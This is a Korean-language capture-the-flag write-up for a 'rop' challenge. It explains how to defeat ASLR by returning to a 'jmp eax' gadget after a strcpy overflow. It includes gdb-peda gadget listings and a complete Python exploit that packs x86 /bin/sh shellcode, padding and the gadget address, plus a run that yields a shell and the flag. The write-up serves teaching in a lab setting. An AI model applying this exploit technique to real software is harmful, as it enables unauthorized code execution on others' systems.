#### 1. 문제 분석

이번 문제는 ```System 100``` 문제와 매우 유사하게 생겼으나 전역변수인 shellcode가 없어졌습니다.

따라서 이번에는 ASLR을 피해갈 수 없을것 같군요... ㅠㅠ

문제의 설명에도 나와있듯이 ASLR을 무력화 하기위하여 우리는 ROP라는 기술을 사용하려고 합니다.

사실 그렇게 거창한것도 아니고 그냥 문제 binary 안에 있는 코드들은 주소가 고정이므로 이 코드들을 사용하여 문제를 푸려고 하는것이죠.
( [PIE](https://en.wikipedia.org/wiki/Position-independent_code)가 걸려있으면 고정이 아니지만 이 문제는 [PIE](https://en.wikipedia.org/wiki/Position-independent_code)가 걸려있지 않습니다. )

찬찬히 문제를 gdb로 디버깅하면서 레지스터 값들을 보면 우리의 인풋 값들이 들어있는 주소를 담고 있는 레지스터가 여럿 보입니다.

그 중에서 가장 깔끔하게 사용할 수 있는 레지스터는 eax인데, 왜 이런가 보니

strcpy 함수가 실행되고 이 함수의 리턴값은 destination의 포인터인데 함수의 리턴값은 eax에 저장됩니다.

따라서 우리의 인풋값을 가리키는 포인터가 eax 레지스터에 들어있게 되는거죠!

우리는 이걸 이용하여 문제 binary 안에 있는 `jmp eax` 코드를 사용하게 되면 `char buffer[64]` 의 주소가 ASLR 때문에 랜덤이더라도 buffer 배열로 jump를 할 수 있게 됩니다.

그러면 buffer 배열에 shellcode를 넣고 return address에는 'jmp eax' 코드의 주소를 넣으면 shellcode가 실행되어 쉘을 얻을 수 있겠죠 하하 


#### 2. 문제 풀이

하지만 아직 우리는 `jmp eax` 코드의 주소를 모릅니다. 어떻게 알아내야 할까요?

여러가지 방법이 있지만 개인적으로는 [PEDA](https://github.com/longld/peda)를 사용하는 방법을 가장 선호합니다.

```Shell
$ gdb -q rop
gdb-peda$ b *main
gdb-peda$ r
gdb-peda$ jmpcall eax
...
0x8050bd4 : jmp eax
0x8052140 : jmp eax
0x805217e : jmp eax
0x8052676 : jmp eax
0x8053ae7 : jmp eax
0x8053b45 : jmp eax
0x8053c1d : jmp eax
0x8053e7d : jmp eax
...
```

`jmp eax` 코드가 아주 많군요. 아무거나 하나 집어서 사용하면 됩니다.

필요한게 다 갖추어 졌으니 공격을 해봅시다.

#### 3. Exploit Code

```Python
# exploit.py
from struct import pack
jmpeax = 0x808c3ba

# gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# buffer + dummy size is 64+12=76
payload = ""
payload+= shellcode
payload+= "\x90"*(76 - len(payload))
payload+= pack("<L", jmpeax)

print payload
```

```Shell
$ ./rop `python exploit.py`
Attack me and read the flag :)
$ cat flag
R0P c4n d3f34t ASLR or more things!
$ exit
```

